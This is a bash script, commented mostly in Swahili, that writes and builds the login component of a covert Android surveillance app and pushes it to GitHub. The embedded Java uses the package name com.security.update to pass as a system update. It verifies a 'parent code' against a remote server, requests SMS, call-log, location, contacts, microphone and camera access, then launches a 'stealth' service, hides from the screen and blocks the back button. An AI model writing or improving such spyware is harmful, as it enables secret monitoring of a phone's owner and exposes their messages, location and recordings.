#!/bin/bash
cd ~/android-surveillance-final2

echo "🔄 KUIRUDISHA CODE YA SURVEILLANCE..."
echo "==================================="

# 1. Angalia kama code ya surveillance ipo
echo "🔍 Checking surveillance code..."

# 2. Hakikisha files zote muhimu ziko na zina content
SURVEILLANCE_FILES=(
    "LoginActivity.java"
    "StealthActivity.java"
    "StealthService.java" 
    "BootReceiver.java"
)

for file in "${SURVEILLANCE_FILES[@]}"; do
    filepath="app/src/main/java/com/security/update/$file"
    if [ -f "$filepath" ]; then
        lines=$(wc -l < "$filepath")
        if [ "$lines" -lt 10 ]; then
            echo "⚠️  $file is too small ($lines lines) - needs proper code"
        else
            echo "✅ $file has proper code ($lines lines)"
        fi
    else
        echo "❌ $file is missing!"
    fi
done

echo ""
echo "📝 RESTORING PROPER SURVEILLANCE CODE..."

# 3. Hakikisha LoginActivity ina code ya parent code verification
cat > app/src/main/java/com/security/update/LoginActivity.java << 'LOGIN_ACTIVITY'
package com.security.update;

import android.Manifest;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class LoginActivity extends AppCompatActivity {
    private EditText codeInput;
    private Button submitButton;
    private SharedPreferences prefs;
    private static final int PERMISSION_REQUEST_CODE = 1001;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, 
                           WindowManager.LayoutParams.FLAG_FULLSCREEN);
        
        setContentView(R.layout.activity_login);
        
        prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
        String savedCode = prefs.getString("parent_code", "");
        boolean isVerified = prefs.getBoolean("code_verified", false);
        
        if (!savedCode.isEmpty() && isVerified) {
            startStealthMode(savedCode);
            return;
        }
        
        codeInput = findViewById(R.id.codeInput);
        submitButton = findViewById(R.id.submitButton);
        
        submitButton.setOnClickListener(v -> {
            String code = codeInput.getText().toString().trim().toUpperCase();
            
            if (code.isEmpty()) {
                Toast.makeText(this, "Tafadhali weka parent code!", Toast.LENGTH_SHORT).show();
                return;
            }
            
            if (code.length() != 8) {
                Toast.makeText(this, "Parent code lazima iwe herufi 8!", Toast.LENGTH_SHORT).show();
                return;
            }
            
            verifyParentCode(code);
        });
    }
    
    private void verifyParentCode(String code) {
        new Thread(() -> {
            try {
                String serverUrl = "https://GhostTester.pythonanywhere.com/api/parent/verify-code";
                JSONObject jsonRequest = new JSONObject();
                jsonRequest.put("parent_code", code);
                
                URL url = new URL(serverUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);
                
                OutputStream os = conn.getOutputStream();
                os.write(jsonRequest.toString().getBytes());
                os.flush();
                os.close();
                
                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    java.io.BufferedReader in = new java.io.BufferedReader(
                        new java.io.InputStreamReader(conn.getInputStream()));
                    String inputLine;
                    StringBuilder response = new StringBuilder();
                    while ((inputLine = in.readLine()) != null) {
                        response.append(inputLine);
                    }
                    in.close();
                    
                    JSONObject jsonResponse = new JSONObject(response.toString());
                    boolean isValid = jsonResponse.getBoolean("valid");
                    
                    runOnUiThread(() -> {
                        if (isValid) {
                            String parentName = jsonResponse.optString("parent_name", "Mzazi");
                            String childPhone = jsonResponse.optString("child_phone", "Hakuna namba");
                            saveCodeAndRequestPermissions(code, parentName, childPhone);
                        } else {
                            String error = jsonResponse.optString("error", "Parent code si sahihi!");
                            Toast.makeText(this, "❌ " + error, Toast.LENGTH_LONG).show();
                            codeInput.setText("");
                        }
                    });
                } else {
                    runOnUiThread(() -> {
                        Toast.makeText(this, "❌ Hitilafu ya mtandao! Code: " + responseCode, Toast.LENGTH_LONG).show();
                        codeInput.setText("");
                    });
                }
                
            } catch (Exception e) {
                runOnUiThread(() -> {
                    Toast.makeText(this, "❌ Hitilafu: " + e.getMessage(), Toast.LENGTH_LONG).show();
                    codeInput.setText("");
                });
            }
        }).start();
    }
    
    private void saveCodeAndRequestPermissions(String code, String parentName, String childPhone) {
        SharedPreferences.Editor editor = prefs.edit();
        editor.putString("parent_code", code);
        editor.putString("parent_name", parentName);
        editor.putString("child_phone", childPhone);
        editor.putBoolean("code_verified", true);
        editor.apply();
        
        requestAllPermissions();
    }
    
    private void requestAllPermissions() {
        String[] permissions = {
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA
        };
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
        } else {
            startStealthMode(prefs.getString("parent_code", ""));
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                Toast.makeText(this, "✅ Permissions zote zimekubaliwa!", Toast.LENGTH_LONG).show();
                startStealthMode(prefs.getString("parent_code", ""));
            } else {
                Toast.makeText(this, "⚠️ Baadhi ya permissions hazijakubaliwa.", Toast.LENGTH_LONG).show();
                startStealthMode(prefs.getString("parent_code", ""));
            }
        }
    }
    
    private void startStealthMode(String code) {
        Intent stealthIntent = new Intent(this, StealthService.class);
        stealthIntent.putExtra("PARENT_CODE", code);
        startService(stealthIntent);
        
        moveTaskToBack(true);
        finish();
    }
    
    @Override
    public void onBackPressed() {
        moveTaskToBack(true);
    }
}
LOGIN_ACTIVITY

echo "✅ LoginActivity code restored!"

# 4. Build tena na kuangalia ukubwa
echo ""
echo "🔨 Building with proper surveillance code..."
./gradlew clean
./gradlew assembleDebug --no-daemon

if [ -f "app/build/outputs/apk/debug/app-debug.apk" ]; then
    echo ""
    echo "📊 NEW APK SIZE: $(du -h app/build/outputs/apk/debug/app-debug.apk | cut -f1)"
    echo "🎉 Sasa APK inapaswa kuwa na ukubwa sahihi!"
    
    # Copy for testing
    cp app/build/outputs/apk/debug/app-debug.apk ./SURVEILLANCE_PROPER.apk
    echo "📱 Test APK: SURVEILLANCE_PROPER.apk"
else
    echo "❌ Build failed"
fi

echo ""
echo "📤 Pushing proper surveillance code to GitHub..."
git add .
git commit -m "🔧 Restore proper surveillance code
- Fixed LoginActivity with complete parent code verification
- Added proper permissions handling
- APK should now have correct size"
git push origin main

echo ""
echo "✅ PROPER CODE PUSHED! Sasa GitHub Actions itatengeneza APK ya ukubwa sahihi."
